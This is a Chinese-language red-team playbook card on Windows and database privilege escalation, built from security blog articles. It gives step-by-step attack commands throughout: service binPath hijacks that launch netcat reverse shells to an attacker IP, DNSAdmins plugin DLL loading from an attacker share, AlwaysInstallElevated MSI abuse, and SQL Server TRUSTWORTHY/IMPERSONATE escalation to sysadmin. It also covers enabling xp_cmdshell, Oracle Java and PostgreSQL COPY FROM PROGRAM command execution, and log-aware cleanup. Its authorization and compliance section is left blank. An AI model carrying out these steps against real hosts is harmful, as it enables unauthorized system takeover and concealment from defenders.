# Windows 与数据库提权路径

## R — 原文 (Reading)

> 1. 内核漏洞 2. 错误的服务权限配置 3. DLL 注入 4. 始终以高权限安装程序 5. 凭证存储。

> — 163 酒仙桥六号部队《红队测试之 Windows 提权小结》· Windows 提权的常见方法

> 因为 java 大多是以 system 权限运行，所以当 oracle 通过 java 获得命令执行权限时，便相当于间接获得了 system 权限。

> — 163 酒仙桥六号部队《数据库：从注入到提权的全家桶套餐》· Oracle 提权

> 由于 SQL Server 数据库开发者的配置不当，设置了可信数据库或者允许用户角色模拟，导致可以 dbo 提权到 dba。

> — 163 酒仙桥六号部队《浅谈 SQL Server 从 DBO 用户提权到 DBA 的两种思路》· 3. 可信数据库

## I — 方法论骨架 (Interpretation)

这个能力解决的是「拿到一个普通用户 shell（或一个只有 db_owner 的数据库账号）之后，怎么在十分钟内找对提权路径，而不是挨个试 EXP」。

核心判断是**先分类、再取利用**。Windows 提权失败的常见原因不是没有 EXP，而是路径选错——内核 EXP 依赖补丁级别且易蓝屏；服务权限依赖可写的 binPath；DLL 劫持依赖特定组成员身份（如 DNSAdmins）；AlwaysInstallElevated 依赖两条组策略都被打开；凭证存储依赖本机存过管理员凭据。五类的枚举信号完全不同，所以必须先跑枚举拿到「哪一类成立」。

五类的信号与代价：

| 类别 | 枚举信号 | 代价/风险 |
|---|---|---|
| 内核漏洞 | `systeminfo` → wesng 比对补丁缺失 | 可能蓝屏；打 2003 尤其危险 |
| 服务权限配置 | 可修改且可重启的服务的 binPath | 需能重启服务；会中断业务 |
| DLL 劫持 | 用户在某特权组（DNSAdmins 等）+ 可写共享路径 | 需组成员身份；重启服务生效 |
| AlwaysInstallElevated | 两处注册表均为 1 | 需两条策略都开；MSI 执行有日志 |
| 凭证存储 | `cmdkey /list` 有保存的管理员凭据 | 依赖本机存过凭据 |

数据库侧是同一逻辑的不同层次。数据库服务进程通常以高权限账户（LocalSystem / postgres / oracle）运行，所以「在数据库里执行命令」约等于「在操作系统上以该账户执行命令」，不需要再打内核提权。两条常见链路：

- **角色提升（db_owner → sysadmin）**：注入点常只拿到 db_owner（能读写本库、不能开 xp_cmdshell）。两条提权都利用「库内代码以更高身份执行」：TRUSTWORTHY ON 的库里，db_owner 可建 `WITH EXECUTE AS OWNER` 的存储过程，而 OWNER 是 sa，于是过程体以 sysadmin 执行；或者开发人员授予了 IMPERSONATE，用户可直接 `EXECUTE AS LOGIN='sa'` 切换身份。两者都是配置问题、无 CVE、通用性强。
- **命令执行（不需要 sysadmin 也能打）**：Oracle 借 Java 存储过程（`dbms_xmlquery.newcontext` 编译 java source + `dbms_java.grant_permission` 授权 + 包装成 function 执行）；PostgreSQL 用 `COPY ... FROM PROGRAM` 直接让服务端起子进程。

判停纪律：**每一步都要能被「再查一次权限」证伪**（`IS_SRVROLEMEMBER('sysadmin')` 从 0 变 1、`whoami /priv` 出现新特权）。没有验证的「应该成功了」是最常见的假进度。

## A1 — 应用示例 (Application Example)

### 示例 1: wesng 选中 MS16-014
- **类型与来源**: 【亲历】163 酒仙桥六号部队《内网渗透从敲门到入门》
- **问题/输入**: 拿到一台 Windows 主机的普通用户 shell，目标是提到管理员。
- **方法论的使用**: `systeminfo` 输出交给 wesng（`python wes.py --update` 后比对），得到候选 CVE 与 EXP 链接；在候选中避开易蓝屏的选项（同批文章在 Server 2003 上特意改用 `ms17_010_command` 而非直接溢出），选中 MS16-014 的本地提权；执行后 `whoami` 验证。
- **结论**: 内核路径的第一步不是「有 EXP」，而是「补丁级别算出候选集」，再按稳定性筛。
- **结果**: 原书交代提权成功。

### 示例 2: 五条路径逐条复现（UsoSvc / DNSAdmins / AlwaysInstallElevated / Vault）
- **类型与来源**: 【实验】163 酒仙桥六号部队《红队测试之 Windows 提权小结》
- **问题/输入**: 需要在同一台实验机上验证五类提权路径的可复现性。
- **方法论的使用**: 服务路径用 PowerUp `InvokeAllChecks` 找可修改且可重启的服务（如 CVE-2019-1322 的 UsoSvc），`sc stop` → `sc config <svc> binPath= "...nc.exe <ip> <port> -e cmd.exe"`（等号后必须有空格）→ `sc config <svc> start= auto` → `sc start`；DLL 路径先确认当前用户在 DNSAdmins 组，`dnscmd /config /serverlevelplugindll \\attacker\s\rev.dll` 后重启 dns 服务；MSI 路径先查两处 `AlwaysInstallElevated` 均为 1 再 `msiexec /quiet /qn /i evil.msi`；凭证路径 `cmdkey /list` 发现保存的管理员凭据后 `runas /user:administrator /savecred "nc.exe -e cmd.exe <ip> <port>"`。
- **结论**: 五条路径的「前提」各不相同，任何一条失败都应回到枚举而不是换 EXP 硬试。
- **结果**: 原书交代五条路径均复现成功；同时记录了失败面——`binPath=` 与路径之间漏空格会配置失败，普通用户执行 `dnscmd` 会失败。

### 示例 3: SQL Server 从 db_owner 到 sysadmin
- **类型与来源**: 【例题/实验】163 酒仙桥六号部队《浅谈 SQL Server 从 DBO 用户提权到 DBA 的两种思路》
- **问题/输入**: SQL 注入只拿到某库的 db_owner，`xp_cmdshell` 开不了。
- **方法论的使用**: 先 `SELECT IS_SRVROLEMEMBER('sysadmin')` 确认还需提权；查可信库 `SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases a INNER JOIN sys.databases b ON a.name=b.name`，目标库为 1；`CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'TestUser','sysadmin'` 然后 `EXEC sp_elevate_me`；若目标库不可信，改走模拟：查 `sys.server_permissions` 里 `permission_name='IMPERSONATE'` 的授权，有 sa 则 `EXECUTE AS LOGIN='sa'`。
- **结论**: 两条都不依赖 CVE，依赖开发配置；`sp_addsrvrolemember` 必须在目标库上下文中执行。
- **结果**: 原书在本地 SQL Server 2014 完整复现两条路径，并给出对应 msf 模块 `mssql_escalate_dbowner` / `mssql_escalate_execute_as`。

## A2 — 触发场景 (Future Trigger) ★

### 用户会在什么情境下需要它
1. 拿到一个普通用户 shell，不知道从哪类路径开始。
2. 手上有多个候选 EXP，需要判断哪个风险最低、最可能成功。
3. SQL 注入只有 db_owner，需要判断能不能提到 sysadmin 或直接执行命令。
4. 遇到 Oracle / PostgreSQL 注入，需要判断能否用数据库进程执行系统命令。
5. 提权失败多次，需要判断是「路径错」还是「前提不成立」。

### 语言信号（出现这些就该激活）
- 中文：「Windows 提权思路」「拿到 shell 是普通用户」「服务权限提权」「dbo 权限怎么提权」「sqlserver 注入只有 dbo」「oracle 注入怎么执行命令」「postgresql 注入 rce」
- English: "windows privesc checklist", "service binPath privesc", "trustworthy database privilege escalation", "execute as owner", "copy from program", "dbms_xmlquery shell"

### 与相邻能力的区分
- 与 `credential-extraction` 的区别：那张卡从配置/内存/目录复制**读**凭据；本卡是**提升当前进程/会话的权限**，两者常交替使用（提权是为了能读更多）。
- 与 `lateral-execution-channels` 的区别：本卡解决「在本地拿到管理员」，那张卡解决「用管理员凭据打到别的机器」。
- 与 `domain-recon-path` 的区别：本卡不找目标，只解决「已在目标上，怎么变成管理员」。

## E — 可执行步骤 (Execution)

**必需输入**: ①一个 shell 与当前权限（`whoami /priv`、`whoami /groups`）；②系统版本与补丁级别（`systeminfo`，或数据库版本）；③是否有可上传工具的条件；④objective（本地管理员 / SYSTEM / 仅需读某文件）。缺 ④ 时默认按「本地管理员」执行，但要在报告里标注假设。
**交付物与完成标准**: 一份「提权路径评估表」：每类路径一行，含是否成立、依据（枚举输出）、选定利用、执行结果（成功/失败/蓝屏风险）。完成标准是拿到目标权限并有 `whoami` 前后对比证据。

1. **建基线**
   - 做什么：`whoami /priv`、`whoami /groups`、`systeminfo`、`wmic qfe list brief`、`tasklist /svc`；记录当前是否已是管理员、有哪些特权（`SeImpersonate`、`SeBackup` 等直接决定后续路径）。
   - 完成标准：知道「缺什么权限」，以及有没有 `SeImpersonate`/`SeAssignPrimaryToken`（有则优先走令牌类路径，本卡未展开但应先排除）。
   - 判停：若已是 SYSTEM/管理员，本卡结束，转 `credential-extraction`。

2. **枚举五类路径（全部枚举，不跳）**
   - 做什么：内核 → `systeminfo` 交 wesng；服务 → PowerUp `InvokeAllChecks` 或 `accesschk`；DLL → 查当前用户是否在 DNSAdmins 等特权组 + 可写共享；MSI → 查两处 `AlwaysInstallElevated`；凭证 → `cmdkey /list`。
   - 完成标准：五类各有「成立 / 不成立 + 依据」。
   - 判停：若五类全不成立，检查是否漏了「已安装软件的目录可写」「计划任务可写脚本」等未列入本卡的路径，不要直接判定「无法提权」。

3. **按风险排序选路**
   - 做什么：优先级为「配置类（服务/DLL/MSI/凭证）> 内核类」，因为配置类不需重启系统、不会蓝屏；内核类中避开针对老系统的 EXP。
   - 完成标准：写下一句「选它是因为…」，且能说明为什么不选其它成立项。
   - 判停：若唯一成立项是内核 EXP 且目标为 Server 2003/2008，先评估蓝屏对业务的影响；影响不可接受则停止并上报，不做「赌一把」。

4. **执行配置类利用**
   - 做什么：服务 → `sc stop` / `sc config <svc> binPath= " ..."`（等号后留空格）/ `sc config <svc> start= auto` / `sc start`；DLL → `dnscmd /config /serverlevelplugindll \\attacker\s\rev.dll` 后重启 dns；MSI → 确认两处注册表为 1 后 `msiexec /quiet /qn /i evil.msi`；凭证 → `runas /user:administrator /savecred "..."`。
   - 完成标准：拿到新权限，`whoami` 变化可证。
   - 判停：若 `sc config` 报错，先查等号后空格与路径引号；若 `dnscmd` 权限不足，说明不在 DNSAdmins 组，回第 2 步。

5. **判断数据库侧层次**
   - 做什么：`SELECT IS_SRVROLEMEMBER('sysadmin')`、`SELECT SYSTEM_USER`、当前库 `IS_MEMBER('db_owner')`；Oracle 查 `session_privs`；PG 查 `pg_has_role(current_user,'pg_read_server_files','member')` 与版本。
   - 完成标准：知道当前是「库内角色不足」还是「已有高权但未用」。
   - 判停：若既非 db_owner 也无任何角色，本卡的数据库路径不成立，回 Web 层找其它入口。

6. **走数据库角色提升**
   - 做什么：查可信库 → 建 `WITH EXECUTE AS OWNER` 过程并执行 `sp_addsrvrolemember`；或查 `IMPERSONATE` 授权 → `EXECUTE AS LOGIN='sa'`；成功后 `xp_cmdshell` 开关（`sp_configure 'show advanced options',1` → `'xp_cmdshell',1`）。
   - 完成标准：`IS_SRVROLEMEMBER('sysadmin')` 返回 1，且能执行一条系统命令。
   - 判停：若目标库未开 TRUSTWORTHY 且无 IMPERSONATE，两条都不成立，回到信息收集（读管理员表、找后台），不要反复试存储过程。

7. **走数据库命令执行（不需要 sysadmin）**
   - 做什么：Oracle → `dbms_xmlquery.newcontext` 动态编译 java source（内部 `Runtime.getRuntime().exec`）+ `dbms_java.grant_permission` 授 `SYS:java.io.FilePermission <<ALL FILES>> EXECUTE` + 建 function 映射；PG → `CREATE TABLE rce(rce_output text); COPY rce FROM PROGRAM 'whoami'; SELECT * FROM rce;`。
   - 完成标准：命令输出回显在查询结果里。
   - 判停：Oracle 不支持堆查询（`;` 报无效字符），改用联合/盲注/带外；PG 11 之后 `COPY FROM PROGRAM` 收紧到 `pg_read_server_files` 组成员，权限不足即停。

8. **验证与清理**
   - 做什么：记录 `whoami` 前后对比；恢复被修改的服务 binPath/启动类型、删除 DLL 配置、删除临时 MSI/EXE、关闭 `xp_cmdshell`（若不需要长期保留）。
   - 完成标准：目标上不残留本次动作产生的配置变更与落地文件。
   - 判停：若清理本身会产生更多日志（如删除服务触发 7040），记录该权衡，交由 `evasion-and-opsec` 决定是否清理。

## B — 边界 (Boundary) ★

### 不要用的情况
- 目标启用 AppLocker/WDAC + 受控管理员：可写目录与可执行路径被白名单收窄，服务/DLL/MSI 三类路径大面积失效。
- 生产业务主机且不能中断：服务类与 DLL 类都需要重启服务，业务窗口不允许时不能做。
- 已有 `SeImpersonate` 类特权：令牌窃取路径通常更稳、更快，不必走本卡。
- 目标是「提权以读取某文件」：可能 `SeBackupPrivilege` 或直接读 ACL 更省事，不必拿到管理员。

### 已知失败模式
- **内核 EXP 打老系统蓝屏**：033 中作者特意改用 `ms17_010_command` 而非直接溢出，说明稳定性优先于「拿到 SYSTEM」。
- **`binPath=` 与路径之间漏空格**：`sc config` 会配置失败，且失败信息不直观。
- **普通用户执行 `dnscmd`**：直接失败，说明不在 DNSAdmins 组，不是工具问题。
- **MSI 只开一处注册表**：`AlwaysInstallElevated` 需要 HKLM 与 HKCU 两处都为 1。
- **`sp_addsrvrolemember` 在错误上下文执行**：必须在目标库上下文中执行，否则报对象不存在。
- **Oracle 用分号堆查询**：直接报无效字符。
- **把「注入点有 db_owner」当「能提权」**：TRUSTWORTHY 与 IMPERSONATE 都不成立时，两条路都断。
- **不提权就开 xp_cmdshell**：需要 sysadmin，顺序错了会浪费一次动作。
- **不清理**：残留的服务配置与服务账号是蓝队最直接的溯源线索。

### 作者与时代的局限
- 案例集中在 Windows Server 2003–2016 与 SQL Server 2008–2014、Oracle 10g、PostgreSQL 9.x–11。当前主流环境的对应关系已变化：UsoSvc 类服务权限问题被修补；Oracle Java 存储过程在 12c 之后默认权限收紧；PG 11+ 对 `COPY FROM PROGRAM` 的权限要求提高。
- 未覆盖现代 Windows 的几种主要提权面：PrintNightmare 之后的打印服务加固、`SeImpersonate` 在容器环境的行为、以及基于浏览器/Office 的本地提权。
- 未讨论 EDR 对「服务创建 + binPath 指向临时目录」的行为检测：这条路径在当前 EDR 下是高置信告警，书中只把它当技术可行性。
- 数据库侧未讨论云托管数据库（RDS/Azure SQL）：托管实例禁用了 `xp_cmdshell` 与文件系统访问，整条「数据库进程执行系统命令」的假设不成立。

### 容易混淆的方法
- **内核 EXP vs 配置类利用**：前者依赖补丁缺失、风险是蓝屏；后者依赖配置错误、风险是服务中断与日志。不是「强弱」差别。
- **db_owner 提权 vs 直接命令执行**：前者提升数据库角色（之后才能开 xp_cmdshell）；后者用数据库进程直接起子进程，不需要 sysadmin。两条路的入口权限要求不同。
- **本地提权 vs 横向**：本卡只改变「当前主机上的权限」，不产生跨主机访问；拿到管理员后才有资格谈横向。
- **提权 vs 绕过 UAC**：UAC 绕过是「已在该用户桌面会话、只需一次确认」的场景，前提与本地提权不同。

### 授权与合规边界
> 待补充（用户自行填写）
